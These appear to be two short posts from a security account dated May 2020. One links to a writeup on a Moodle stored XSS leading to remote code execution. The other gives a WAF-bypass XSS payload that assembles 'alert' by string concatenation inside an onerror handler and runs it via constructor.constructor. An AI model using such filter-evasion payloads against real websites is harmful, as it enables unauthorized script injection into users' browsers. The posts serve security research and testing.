##User: XssPayloads	Time: 20200527
> 
``` Moodle DOM Stored XSS to RCE, nice writeup by @Abdulahhusam
 https://bit.ly/2A53MUG ```
  
  > 
``` A payload to bypass WAF with concatenation, by @ngkogkos 

onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb````
  
  